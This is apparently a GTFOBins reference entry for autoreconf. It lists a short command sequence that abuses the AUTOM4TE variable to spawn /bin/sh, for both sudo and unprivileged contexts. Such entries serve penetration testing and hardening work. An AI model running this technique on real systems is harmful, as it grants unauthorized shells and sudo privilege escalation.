<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/autoreconf -->
---
functions:
  shell:
  - code: |-
      echo '/bin/sh 1>&0' >/path/to/temp-file
      chmod +x /path/to/temp-file
      echo AC_INIT >configure.ac
      AUTOM4TE=/path/to/temp-file autoreconf
    comment: |-
      The shell is invoked multiple times.
    contexts:
      sudo:
      unprivileged:
...
